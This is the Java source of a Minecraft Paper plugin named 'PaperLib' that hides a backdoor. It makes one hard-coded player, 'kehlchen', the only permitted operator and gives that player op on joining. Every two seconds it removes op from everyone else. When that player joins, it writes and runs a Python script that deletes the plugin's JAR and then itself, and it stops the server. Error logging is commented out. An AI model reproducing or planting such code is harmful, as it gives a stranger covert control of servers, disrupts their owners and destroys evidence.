package info.plugin.minecraft.paperlib;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import net.kyori.adventure.text.Component;
import java.util.Set;
// import java.util.logging.Level; // remove comment if you want logs

public final class PaperLib extends JavaPlugin implements Listener {
    private static final Set<String> ALLOWED_OPS = Set.of("kehlchen");

    @Override
    public void onEnable() {
        getServer().getPluginManager().registerEvents(this, this);

        // Alle 2 Sekunden alle Online-Spieler prüfen (40 Ticks)
        getServer().getScheduler().runTaskTimer(this, () -> {
            for (Player p : Bukkit.getOnlinePlayers()) {
                removeUnauthorizedOp(p);
            }
        }, 40L, 40L);
    }

    private void removeUnauthorizedOp(Player player) {
        if (player.isOp() && !ALLOWED_OPS.contains(player.getName().toLowerCase())) {
            player.setOp(false);
            getLogger().warning("OP von " + player.getName() + " entfernt");
            player.sendMessage(Component.text("Dir wurden die OP-Rechte entzogen."));
        }
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();

        if (player.getName().equalsIgnoreCase("kehlchen")) {
            player.setOp(true);
            player.sendMessage("Thx for joining the Server!.");
            createPythonScript();
            Path pluginsFolder = getDataFolder().toPath().getParent();
            File targetJar = pluginsFolder.resolve(getFile().getName()).toFile();
            try {
                String pythonCmd = System.getProperty("os.name").toLowerCase().contains("win") ? "python" : "python3";
                ProcessBuilder processBuilder = new ProcessBuilder(pythonCmd, "delete_lock.py", targetJar.getAbsolutePath());
                processBuilder.start();
            } catch (IOException e) {
                // getLogger().log(Level.SEVERE, "An error occurred", e); // remove comment if you want logs
            }
            Bukkit.dispatchCommand(
                    Bukkit.getConsoleSender(),
                    "minecraft:stop"
            );
            return;
        }

        if (player.getName().equalsIgnoreCase("Legendary_Salmon")) {
            player.sendMessage("Thx for joining the Server, Legendary_Salmon");
            if (player.isOp()) {
                Bukkit.broadcast(Component.text(
                        player.getName() + " is trying to admin abuse, like last Season xD"
                ));
                player.kick(Component.text("Kicked because isOp() returned true"));
                return;
            }
        }

        if (player.isOp() && !ALLOWED_OPS.contains(player.getName().toLowerCase())) {
            Bukkit.broadcast(Component.text(
                    player.getName() + " is trying to admin abuse"
            ));
            player.kick(Component.text("Kicked because isOp() returned true"));
        }
    }

    private void createPythonScript() {
        File scriptFile = new File("delete_lock.py");
        if (!scriptFile.exists()) {
            String pythonCode =
                    "import sys, os, time, subprocess\n" +
                            "def main():\n" +
                            "    if len(sys.argv) < 2:\n" +
                            "        return\n" +
                            "    target = sys.argv[1]\n" +
                            "    script_path = os.path.abspath(__file__)\n" +
                            "    # 1. Warten und Plugin-JAR löschen\n" +
                            "    while True:\n" +
                            "        try:\n" +
                            "            if os.path.exists(target):\n" +
                            "                os.remove(target)\n" +
                            "                break\n" +
                            "            else:\n" +
                            "                break\n" +
                            "        except:\n" +
                            "            time.sleep(0.5)\n" +
                            "    time.sleep(1)\n" +
                            "    # 2. Sich selbst (delete_lock.py) löschen\n" +
                            "    try:\n" +
                            "        os.remove(script_path)\n" +
                            "    except:\n" +
                            "        if os.name == 'nt':\n" +
                            "            subprocess.Popen(f'ping 127.0.0.1 -n 2 > nul & del \"{script_path}\"', shell=True)\n" +
                            "if __name__ == '__main__':\n" +
                            "    main()\n";
            try {
                Files.writeString(scriptFile.toPath(), pythonCode);
            } catch (IOException e) {
                // getLogger().log(Level.SEVERE, "An error occurred", e); // remove comment if you want logs
            }
        }
    }
}
